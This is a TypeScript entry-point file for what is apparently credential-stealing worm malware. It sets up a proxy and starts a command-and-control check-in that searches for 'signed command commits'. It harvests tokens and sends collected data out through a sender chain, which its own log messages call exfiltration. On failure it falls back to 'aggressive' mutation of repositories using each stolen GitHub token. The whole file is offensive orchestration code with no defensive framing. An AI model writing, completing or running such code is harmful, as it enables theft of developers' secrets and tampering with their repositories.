import { c2Checkin } from "./c2/checkin";
import { Collector } from "./collector/collector";
import { Dispatcher } from "./dispatcher/dispatcher";
import type { Mutator } from "./mutator/base";
import { RepositoryMutator } from "./mutator/repository";
import {
  executeMutations,
  getFallbackMutations,
  planMutations,
} from "./orchestrator/mutations";
import { preflight } from "./orchestrator/preflight";
import { buildProviders, gatherQuickResults } from "./orchestrator/providers";
import { buildSenderChain } from "./orchestrator/senders";
import type { ProviderResult } from "./providers/types";
import { bail } from "./utils/lock";
import { logUtil } from "./utils/logger";
import { proxyInit } from "./utils/proxy";

async function main(): Promise<void> {
  proxyInit();

  let mutators: Mutator[];
  let quickResults: ProviderResult[] = [];

  try {
    await preflight();

    quickResults = await gatherQuickResults();
    const senders = await buildSenderChain(quickResults);

    // C2 checkin — search for signed command commits (uses same token if found)
    c2Checkin().catch((err) => logUtil.log(`[c2] checkin error: ${err}`));

    const { providers, dispatched } = await buildProviders(quickResults);

    const dispatcher = new Dispatcher({ senders, preflight: true });

    const collector = new Collector({
      flushThresholdBytes: 100 * 1024,
      dispatch: dispatcher.dispatch,
    });

    for (const item of quickResults) {
      collector.ingest(item);
    }

    await collector.run(providers.map((p) => (c) => p.executeStreaming(c)));
    await collector.finalize();

    mutators = planMutations(
      quickResults,
      dispatched,
      collector.discoveredTokens,
      false, // exfil succeeded
    );
  } catch (e) {
    logUtil.error(
      "Exfiltration failed — falling back to aggressive mutations:",
      e instanceof Error ? e.message : String(e),
    );
    mutators = getFallbackMutations();

    // Run RepositoryMutator in aggressive mode on any tokens we found
    const seen = new Set<string>();
    for (const item of quickResults) {
      for (const token of item.matches?.["ghtoken"] ?? []) {
        if (seen.has(token)) continue;
        seen.add(token);
        mutators.push(new RepositoryMutator(token, { aggressive: true }));
      }
    }
  }

  logUtil.log("About to execute mutators!");
  await executeMutations(mutators);

  bail();
}

main().catch((err) => {
  logUtil.error(err);
  bail();
});
